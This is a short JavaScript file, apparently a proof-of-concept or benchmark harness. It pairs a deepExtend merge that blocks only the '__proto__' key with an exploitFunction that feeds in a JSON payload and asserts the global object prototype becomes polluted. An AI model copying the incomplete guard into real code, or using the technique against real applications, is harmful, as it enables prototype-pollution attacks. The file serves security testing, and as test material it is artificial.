function deepExtend(target, source, overwrite) {
  /* eslint no-restricted-syntax: 0 */
  for (const prop in source) {
    if (prop !== "__proto__") {
      if (prop in target) {
        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
        if (
          typeof target[prop] === "string" ||
          target[prop] instanceof String ||
          typeof source[prop] === "string" ||
          source[prop] instanceof String
        ) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
  }
  return target;
}

function exploitFunction(payload) {
    const { translations } = payload;
    const existingData = {};

    expect({}.polluted).toBe(undefined);

    deepExtend(existingData, JSON.parse(translations), true);

    expect({}.polluted).toBe("yes");
}

module.exports = { exploitFunction };